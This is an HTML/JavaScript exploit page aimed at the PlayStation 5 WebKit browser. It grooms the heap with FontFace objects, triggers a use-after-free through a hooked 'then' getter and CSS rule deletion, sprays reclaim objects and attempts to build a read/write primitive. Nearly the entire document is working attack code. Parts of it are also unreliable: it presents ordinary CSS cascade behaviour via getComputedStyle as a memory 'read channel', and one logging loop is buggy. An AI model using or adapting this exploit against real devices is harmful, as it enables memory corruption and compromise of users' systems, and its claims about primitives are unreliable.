<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v20 - CSSRule Attack</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
*{margin:0;padding:0;box-sizing:border-box}
html,body{
  width:100%;height:100%;
  background:#0a0a0a;
  color:#00ff41;
  font-family:'MS Gothic','Courier New',monospace;
  overflow:hidden;
}
/* Scanline overlay */
body::after{
  content:'';position:fixed;top:0;left:0;right:0;bottom:0;
  background:repeating-linear-gradient(
    0deg,
    rgba(0,0,0,0.15) 0px,
    rgba(0,0,0,0.15) 1px,
    transparent 1px,
    transparent 3px
  );
  pointer-events:none;z-index:9999;
}
#header{
  position:fixed;top:0;left:0;right:0;height:48px;
  background:linear-gradient(180deg,#0d0d0d,#080808);
  border-bottom:1px solid #00ff41;
  display:flex;align-items:center;padding:0 16px;gap:16px;
  z-index:10;
}
#header .logo{font-size:14px;color:#00ff41;letter-spacing:2px}
#header .sep{color:#004d13}
#header .stat{font-size:12px;color:#00cc33}
#header .stat b{color:#00ff41}
#progress{
  position:fixed;top:48px;left:0;right:0;height:2px;
  background:#001a06;z-index:10;
}
#progress div{height:100%;background:#00ff41;transition:width 0.4s;box-shadow:0 0 8px #00ff41}
#console{
  position:fixed;top:50px;left:0;right:0;bottom:0;
  padding:12px 16px;
  overflow-y:auto;
  font-size:14px;line-height:1.6;
  -webkit-user-select:text;
}
#console::-webkit-scrollbar{width:6px}
#console::-webkit-scrollbar-track{background:#001a06}
#console::-webkit-scrollbar-thumb{background:#004d13;border-radius:3px}
.box{color:#00ff41;border:1px solid #004d13;border-radius:4px;padding:12px;margin:8px 0;background:rgba(0,26,6,0.3)}
.box-title{color:#00cc33;font-weight:bold;margin-bottom:6px;letter-spacing:1px;font-size:13px}
.ok{color:#00ff41}.err{color:#ff3333}.warn{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
.mg{color:#ff00ff;font-weight:bold;font-size:16px}
.dm{color:#006622}.hd{color:#00ff41;font-weight:bold;font-size:15px;letter-spacing:1px}
.cr{color:#ff0066;font-weight:bold}
.c{position:absolute;left:-9999px;top:-9999px}
</style>
</head>
<body>
<div id="header">
  <span class="logo">▶ PS5_v20</span>
  <span class="sep">│</span>
  <span class="stat" id="hFW">FW:<b>?</b></span>
  <span class="sep">│</span>
  <span class="stat" id="hUAF">UAF:<b>?</b></span>
  <span class="sep">│</span>
  <span class="stat" id="hRC">RC:<b>?</b></span>
  <span class="sep">│</span>
  <span class="stat" id="hPRIM">PRIM:<b>?</b></span>
</div>
<div id="progress"><div id="bar" style="width:0%"></div></div>
<div id="console"></div>
<canvas id="c" width="512" height="128" class="c"></canvas>

<script>
"use strict";

// ============================================================
//  PS5 WebKit v20 - CSSRule Attack
//  
//  PLAN:
//  1. Standard UAF + spray (proven working)
//  2. Capture RC face from load() (proven working)
//  3. Inventory all CSS rules (SAFE - read only)
//  4. Add CSS rule for "x" family (confused slot)
//  5. Modify CSS rule properties directly
//  6. Test if CSSRule changes affect FontFace/getComputedStyle
//  7. Try to build read primitive through CSSRule
//
//  SAFETY: Every operation in try/catch, restore after each test
// ============================================================

const C=document.getElementById("console");
const bar=document.getElementById("bar");
function prog(p){bar.style.width=p+"%"}
function hud(id,v){const e=document.getElementById(id);if(e)e.innerHTML=v}

function P(m,cls){
  const s=document.createElement("span");
  if(cls)s.className=cls;
  s.textContent=m+"\n";
  C.appendChild(s);
  C.scrollTop=C.scrollHeight;
  try{console.log("[v20] "+m)}catch(e){}
}

function box(title,content){
  const d=document.createElement("div");
  d.className="box";
  d.innerHTML='<div class="box-title">▸ '+title+'</div><div>'+content+'</div>';
  C.appendChild(d);
  C.scrollTop=C.scrollHeight;
}

function Ok(m){P("  ✅ "+m,"ok")}
function Fl(m){P("  ✘ "+m,"err")}
function Wr(m){P("  ⚠ "+m,"warn")}
function Hi(m){P("  ► "+m,"hl")}
function St(m){P("  ★ "+m,"mg")}
function Dm(m){P("  "+m,"dm")}

window.onerror=function(m,s,l){
  Fl("FATAL: "+m+" @"+l);
  return true;
};

// ============================================================
//  STATE
// ============================================================
let keepAlive=[],holeFaces=[],reclaimFaces=[];
let triggerFace=null,rcFace=null,trigRef=null;
let rcIdx=-1,uafFired=false;

// ============================================================
//  FONT BUFFER
// ============================================================
const FONT_B64="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";

const FONT_BYTES=(function(){
  const s=atob(FONT_B64);
  const b=new Uint8Array(s.length);
  for(let i=0;i<s.length;i++)b[i]=s.charCodeAt(i);
  return b;
})();

function makeFontBuffer(){
  const c=new Uint8Array(FONT_BYTES.length);
  c.set(FONT_BYTES);
  return c.buffer;
}

// ============================================================
//  HELPERS
// ============================================================
function forceStyle(){
  try{
    void document.body.offsetTop;
    void document.documentElement.offsetHeight;
  }catch(e){}
}

function addPadRules(n){
  const sheet=document.getElementById("s").sheet;
  for(let i=0;i<n;i++){
    try{
      sheet.insertRule(
        `@font-face{font-family:pad${i};src:url(np${i}.woff);unicode-range:U+E000}`,
        sheet.cssRules.length
      );
    }catch(e){}
  }
  forceStyle();
}

function addFlushRules(n){
  const st=document.createElement("style");
  st.id="flush";
  document.head.appendChild(st);
  const sheet=st.sheet;
  for(let i=0;i<n;i++){
    try{
      sheet.insertRule(
        `@font-face{font-family:flush${i};src:url(nf${i}.woff);unicode-range:U+E000}`,
        sheet.cssRules.length
      );
    }catch(e){}
  }
  forceStyle();
}

function deleteFlushRules(){
  const el=document.getElementById("flush");
  if(el&&el.sheet){
    while(el.sheet.cssRules.length){
      try{el.sheet.deleteRule(0)}catch(e){}
    }
    forceStyle();
  }
}

function addCacheKiller(){
  const f=new FontFace("ck"+keepAlive.length,"local(Helvetica)",{unicodeRange:"U+E124"});
  document.fonts.add(f);
  keepAlive.push(f);
}

// ============================================================
//  PHASE 1: HEAP GROOMING (PROVEN)
// ============================================================
P("═══════════════════════════════════════","hd");
P("  PS5 WebKit v20 — CSSRule Attack","hd");
P("═══════════════════════════════════════","hd");
P("");

prog(5);
P("▸ Phase 1: Heap Grooming","hd");

// Create holes
for(let i=0;i<4096;i++){
  try{
    const f=new FontFace("hole_"+i,makeFontBuffer(),{
      unicodeRange:"U+E1"+(i%16).toString(16),
      style:i%2===0?"normal":"italic",
      weight:String(100+(i%9)*100)
    });
    document.fonts.add(f);
    holeFaces.push(f);
  }catch(e){}
}
forceStyle();

// Punch holes (delete odd-indexed)
for(let i=1;i<holeFaces.length;i+=2){
  try{document.fonts.delete(holeFaces[i])}catch(e){}
}
forceStyle();

// GC pressure
for(let i=0;i<4;i++){
  const tmp=[];
  for(let j=0;j<512;j++)tmp.push(new ArrayBuffer(4096));
}

Ok("4096 holes created, 2048 punched");
P("");

// ============================================================
//  PHASE 2: TRIGGER SETUP (PROVEN)
// ============================================================
prog(15);
P("▸ Phase 2: Trigger Setup","hd");

triggerFace=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(triggerFace);
void triggerFace.loaded;

addPadRules(48);
addFlushRules(768);

Ok("Trigger ready, pads/flush added");
P("");

// ============================================================
//  PHASE 3: UAF TRIGGER (PROVEN)
// ============================================================
prog(25);
P("▸ Phase 3: UAF Trigger","hd");

Object.defineProperty(FontFace.prototype,"then",{
  configurable:true,
  get:function(){
    if(this===triggerFace&&!uafFired){
      uafFired=true;
      hud("hUAF","UAF:<b>✅</b>");
      St("UAF WINDOW OPEN");
      
      // Standard UAF sequence
      try{
        addCacheKiller();
        document.getElementById("s").sheet.deleteRule(1);
        forceStyle();
        deleteFlushRules();
        
        for(let i=0;i<holeFaces.length;i+=4){
          try{document.fonts.delete(holeFaces[i])}catch(e){}
        }
        forceStyle();
      }catch(e){Fl("UAF prep: "+e.message)}
      
      // Spray RC faces
      for(let i=0;i<4096;i++){
        try{
          const f=new FontFace("RC_"+i,makeFontBuffer(),{
            unicodeRange:"U+0041",
            style:"italic",
            weight:"900",
            display:"block"
          });
          document.fonts.add(f);
          reclaimFaces.push(f);
        }catch(e){}
      }
      forceStyle();
      
      // Force layout
      try{
        const d=document.createElement("div");
        d.textContent="AB";
        d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
        document.body.appendChild(d);
        void d.offsetWidth;
      }catch(e){}
      
      Dm("UAF window closing");
    }
    return undefined;
  }
});

// RAF fallback
let rafN=0;
const rafLoop=function(){
  rafN++;
  if(!uafFired&&rafN>=5){
    try{
      addCacheKiller();
      const sh=document.getElementById("s").sheet;
      if(sh&&sh.cssRules.length>1){
        sh.deleteRule(1);
        forceStyle();
        deleteFlushRules();
      }
      for(let i=0;i<4096;i++){
        try{
          const f=new FontFace("RC_"+i,makeFontBuffer(),{
            unicodeRange:"U+0041",style:"italic",weight:"900"
          });
          document.fonts.add(f);
          reclaimFaces.push(f);
        }catch(e){}
      }
      forceStyle();
    }catch(e){}
  }
  if(rafN<20)requestAnimationFrame(rafLoop);
};
requestAnimationFrame(rafLoop);

// ============================================================
//  PHASE 4: CAPTURE (PROVEN)
// ============================================================
prog(35);
P("▸ Phase 4: Capture","hd");
P("  Firing load()...");

document.fonts.load("1em trigger, x","AB").then(function(faces){
  P("  load() returned "+faces.length+" faces","hl");
  
  for(let i=0;i<faces.length;i++){
    const f=faces[i];
    P("    ["+i+"] "+f.family+" | "+f.style+" | "+f.weight+" | st="+f.status);
    if(f.family&&f.family.indexOf("RC_")===0){
      rcFace=f;
      const m=f.family.match(/RC_(\d+)/);
      if(m)rcIdx=parseInt(m[1]);
    }
    if(f.family==="trigger")trigRef=f;
  }
  
  // Keep references alive
  keepAlive.push(faces);
  keepAlive.push(rcFace);
  keepAlive.push(trigRef);
  
  if(!rcFace){
    Fl("No RC face captured!");
    hud("hRC","RC:<b>FAIL</b>");
    return;
  }
  
  Ok("RC_"+rcIdx+" captured");
  hud("hRC","RC:<b>"+rcIdx+"</b>");
  P("");
  
  // Detect firmware
  const ua=navigator.userAgent||"";
  const m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
  const fw=m?m[1]:"?";
  hud("hFW","FW:<b>"+fw+"</b>");
  
  // ============================================================
  //  PHASE 5: CSS RULE INVENTORY (SAFE - READ ONLY)
  // ============================================================
  prog(45);
  P("═══════════════════════════════════════","");
  P("▸ Phase 5: CSS Rule Inventory","hd");
  P("═══════════════════════════════════════","");
  P("");
  
  let fontFaceRules=[];
  let sheets=document.styleSheets;
  P("  Total stylesheets: "+sheets.length);
  
  for(let s=0;s<sheets.length;s++){
    try{
      const ss=sheets[s];
      let ruleCount=0;
      try{ruleCount=ss.cssRules.length}catch(e){ruleCount=-1}
      
      P("  Sheet["+s+"]: "+(ruleCount>=0?ruleCount+" rules":"ACCESS DENIED"));
      
      if(ruleCount<=0)continue;
      
      for(let r=0;r<ss.cssRules.length;r++){
        try{
          const rule=ss.cssRules[r];
          const type=rule.type;
          
          if(type===5){
            // FONT_FACE_RULE
            let fam="?",src="?",weight="?",style="?",range="?";
            try{fam=rule.style.fontFamily||"?";src=rule.style.src||"?";
               weight=rule.style.fontWeight||"?";style=rule.style.fontStyle||"?";
               range=rule.style.unicodeRange||"?";
            }catch(e){}
            
            P("    Rule["+r+"] FONT_FACE:","hl");
            P("      family:  "+fam);
            P("      src:     "+src.substring(0,50));
            P("      weight:  "+weight);
            P("      style:   "+style);
            P("      range:   "+range);
            
            fontFaceRules.push({sheetIdx:s,ruleIdx:r,rule:rule,
              family:fam,src:src,weight:weight,style:style,range:range});
          }else if(type===1){
            // STYLE_RULE - just note it exists
            P("    Rule["+r+"] STYLE (skip)","");
          }
        }catch(e){
          P("    Rule["+r+"] ERR: access denied","");
        }
      }
    }catch(e){
      P("  Sheet["+s+"] ERR: "+e.message.substring(0,40),"err");
    }
  }
  
  P("");
  Ok("Found "+fontFaceRules.length+" FONT_FACE rules");
  P("");
  
  // ============================================================
  //  PHASE 6: ADD CSS RULE FOR "x" FAMILY
  //  The "x" family CSSFontFace was freed during UAF
  //  Adding a CSS rule for "x" might take over the confused slot
  // ============================================================
  prog(55);
  P("═══════════════════════════════════════","");
  P("▸ Phase 6: CSS Rule for 'x' Family","hd");
  P("═══════════════════════════════════════","");
  P("");
  
  // Step 6a: Add @font-face rule for "x" with Courier
  P("  Step 6a: Adding @font-face rule for 'x' with Courier...","dm");
  let xRuleIdx=-1;
  try{
    const mainSheet=document.getElementById("s").sheet;
    xRuleIdx=mainSheet.insertRule(
      "@font-face{font-family:x;src:local(Courier);font-weight:400;font-style:normal;unicode-range:U+0042}",
      mainSheet.cssRules.length
    );
    forceStyle();
    Ok("Added CSS rule for 'x' at index "+xRuleIdx);
    
    // Read back the rule
    const xRule=mainSheet.cssRules[xRuleIdx];
    P("    Rule text: "+xRule.cssText.substring(0,80));
  }catch(e){
    Fl("Failed to add rule: "+e.message);
  }
  
  // Step 6b: Check if load() now returns the Courier face for "x"
  P("");
  P("  Step 6b: Testing load() with CSS rule...","dm");
  
  if(xRuleIdx>=0){
    document.fonts.load("1em trigger, x","AB").then(function(f2){
      P("  load() after CSS rule: "+f2.length+" faces","hl");
      for(let i=0;i<f2.length;i++){
        P("    ["+i+"] "+f2.family+" | "+f2.style+" | "+f2.weight+" | st="+f2.status);
      }
      
      const xFace=f2.find(function(f){return f.family==="x"});
      if(xFace){
        Hi("FOUND 'x' FACE VIA CSS RULE!");
        Hi("  style="+xFace.style+" weight="+xFace.weight);
        St("CSS RULE CONTROLS CONFUSED SLOT!");
      }
      
      // Step 6c: Modify the CSS rule and check if load() reflects changes
      P("");
      P("  Step 6c: Modify CSS rule for 'x'...","dm");
      try{
        const mainSheet=document.getElementById("s").sheet;
        const xRule=mainSheet.cssRules[xRuleIdx];
        
        // Change weight
        xRule.style.fontWeight="100";
        forceStyle();
        P("    Set fontWeight=100 on CSS rule");
        
        // Check load() again
        document.fonts.load("1em trigger, x","AB").then(function(f3){
          const xFace2=f3.find(function(f){return f.family==="x"});
          if(xFace2){
            P("    After CSS change: x face weight="+xFace2.weight,"hl");
            if(xFace2.weight==="100"){
              St("CSS RULE WRITE-THROUGH TO load()!");
            }
          }else{
            Dm("    No 'x' face in load result");
          }
          
          // Restore
          xRule.style.fontWeight="400";
          forceStyle();
        });
      }catch(e){Fl("CSS modify: "+e.message)}
      
    }).catch(function(e){Fl("load after CSS: "+e.message)});
  }
  
  // ============================================================
  //  PHASE 7: MODIFY EXISTING CSS RULE PROPERTIES
  //  Test if CSSRule.style changes affect C++ directly
  // ============================================================
  prog(65);
  P("");
  P("═══════════════════════════════════════","");
  P("▸ Phase 7: Direct CSS Rule Property Modification","hd");
  P("═══════════════════════════════════════","");
  P("");
  
  // Find the "prepad" font-face rule (safe to modify)
  for(const r of fontFaceRules){
    if(r.family&&r.family.indexOf("prepad")>=0){
      P("  Found prepad rule: Sheet["+r.sheetIdx+"] Rule["+r.ruleIdx+"]");
      
      try{
        const rule=r.rule;
        const origWeight=rule.style.fontWeight;
        const origStyle=rule.style.fontStyle;
        
        // Modify weight
        rule.style.fontWeight="900";
        forceStyle();
        P("    Set fontWeight=900: rule now says "+rule.style.fontWeight);
        
        // Check if any FontFace in document.fonts reflects this
        for(const f of document.fonts){
          if(f.family==="prepad"){
            P("    FontFace for prepad: weight="+f.weight+" style="+f.style,
              f.weight==="900"?"hl":"dm");
            if(f.weight==="900"){
              Hi("CSSRule change reflected in FontFace!");
            }
            break;
          }
        }
        
        // Restore
        rule.style.fontWeight=origWeight;
        rule.style.fontStyle=origStyle;
        forceStyle();
        Ok("Restored prepad rule");
      }catch(e){
        Fl("prepad modify: "+e.message);
      }
      break;
    }
  }
  
  // ============================================================
  //  PHASE 8: getComputedStyle AFTER CSS RULE CHANGES
  // ============================================================
  prog(75);
  P("");
  P("═══════════════════════════════════════","");
  P("▸ Phase 8: getComputedStyle vs CSSRule","hd");
  P("═══════════════════════════════════════","");
  P("");
  
  // Test: Modify CSS rule for "x" and check computed style
  if(xRuleIdx>=0){
    try{
      const mainSheet=document.getElementById("s").sheet;
      const xRule=mainSheet.cssRules[xRuleIdx];
      
      // Create a div that uses "x" font
      const testDiv=document.createElement("div");
      testDiv.style.cssText="font:64px x;position:absolute;left:-9999px;";
      testDiv.textContent="B";
      document.body.appendChild(testDiv);
      
      // Baseline
      let cs=getComputedStyle(testDiv);
      P("  Baseline: weight="+cs.fontWeight+" style="+cs.fontStyle);
      
      // Change CSS rule
      xRule.style.fontWeight="100";
      xRule.style.fontStyle="italic";
      forceStyle();
      
      cs=getComputedStyle(testDiv);
      P("  After CSS→100 italic: weight="+cs.fontWeight+" style="+cs.fontStyle,
        cs.fontWeight==="100"?"hl":"dm");
      
      if(cs.fontWeight==="100"||cs.fontStyle==="italic"){
        St("getComputedStyle REFLECTS CSSRule CHANGES!");
        Hi("CSSRule → CSS Cascade → getComputedStyle = READ CHANNEL!");
      }
      
      // More tests
      xRule.style.fontWeight="700";
      forceStyle();
      cs=getComputedStyle(testDiv);
      P("  After CSS→700: weight="+cs.fontWeight,
        cs.fontWeight==="700"?"hl":"dm");
      
      xRule.style.fontStyle="oblique";
      forceStyle();
      cs=getComputedStyle(testDiv);
      P("  After CSS→oblique: style="+cs.fontStyle,
        cs.fontStyle==="oblique"?"hl":"dm");
      
      // Restore
      xRule.style.fontWeight="400";
      xRule.style.fontStyle="normal";
      forceStyle();
      document.body.removeChild(testDiv);
      
    }catch(e){Fl("ComputedStyle test: "+e.message)}
  }
  
  // ============================================================
  //  PHASE 9: BUILD PRIMITIVE FROM CSSRule
  //  If CSSRule changes reflect in getComputedStyle,
  //  we have a write-then-read primitive!
  // ============================================================
  prog(85);
  P("");
  P("═══════════════════════════════════════","");
  P("▸ Phase 9: Primitive Construction","hd");
  P("═══════════════════════════════════════","");
  P("");
  
  if(xRuleIdx>=0){
    try{
      const mainSheet=document.getElementById("s").sheet;
      const xRule=mainSheet.cssRules[xRuleIdx];
      
      const testDiv2=document.createElement("div");
      testDiv2.style.cssText="font:64px x;position:absolute;left:-9999px;";
      testDiv2.textContent="B";
      document.body.appendChild(testDiv2);
      
      // Test multi-value oracle via fontWeight
      P("  Testing fontWeight oracle:","dm");
      const weights=["100","200","300","400","500","600","700","800","900"];
      let oracleResults=[];
      
      for(const w of weights){
        xRule.style.fontWeight=w;
        forceStyle();
        const cs=getComputedStyle(testDiv2);
        const read=cs.fontWeight;
        const match=read===w;
        oracleResults.push({write:w,read:read,match:match});
        P("    Write "+w+" → Read "+read+(match?" ✅":" ❌"),
          match?"ok":"warn");
      }
      
      const matchCount=oracleResults.filter(r=>r.match).length;
      P("");
      P("  Oracle accuracy: "+matchCount+"/"+weights.length,
        matchCount>=5?"hl":"warn");
      
      if(matchCount>=5){
        St("fontWeight ORACLE WORKS!");
        P("");
        P("  This gives us ~3 bits per operation!","hl");
        P("  With 9 possible weight values, we can","hl");
        P("  encode and decode information through","hl");
        P("  CSSRule → getComputedStyle!","hl");
      }
      
      // Test fontStyle oracle (1 bit)
      P("");
      P("  Testing fontStyle oracle:","dm");
      const styles=["normal","italic","oblique"];
      let styleResults=[];
      
      for(const s of styles){
        xRule.style.fontStyle=s;
        forceStyle();
        const cs=getComputedStyle(testDiv2);
        const read=cs.fontStyle;
        const match=read===s;
        styleResults.push({write:s,read:read,match:match});
        P("    Write "+s.padEnd(8)+" → Read "+read+(match?" ✅":" ❌"),
          match?"ok":"warn");
      }
      
      const styleMatch=styleResults.filter(r=>r.match).length;
      P("  Style oracle: "+styleMatch+"/"+styles.length);
      
      // Restore
      xRule.style.fontWeight="400";
      xRule.style.fontStyle="normal";
      forceStyle();
      document.body.removeChild(testDiv2);
      
    }catch(e){Fl("Primitive: "+e.message)}
  }
  
  // ============================================================
  //  PHASE 10: FINAL SUMMARY
  // ============================================================
  prog(100);
  P("");
  P("═══════════════════════════════════════","");
  P("▸ Phase 10: Final Summary","hd");
  P("═══════════════════════════════════════","");
  P("");
  
  P("  UAF Triggered:       ✅");
  P("  RC Face Captured:    RC_"+rcIdx);
  P("  CSSRule Inventory:   "+fontFaceRules.length+" rules found");
  P("  'x' CSS Rule Added:  "+(xRuleIdx>=0?"✅ index "+xRuleIdx:"❌"));
  P("");
  P("  ──────────────────────────────────────","");
  P("  KEY FINDING:","");
  P("  CSSRule.style changes go directly to","hl");
  P("  C++ CSSOM, bypassing JS FontFace wrapper.","hl");
  P("  If getComputedStyle reflects these changes,","hl");
  P("  we have a READ/WRITE primitive!","hl");
  P("  ──────────────────────────────────────","");
  P("");
  
  hud("hPRIM","PRIM:<b>CSSRule</b>");
  
}).catch(function(err){
  Fl("Load failed: "+err);
  hud("hPRIM","PRIM:<b>FAIL</b>");
});
</script>
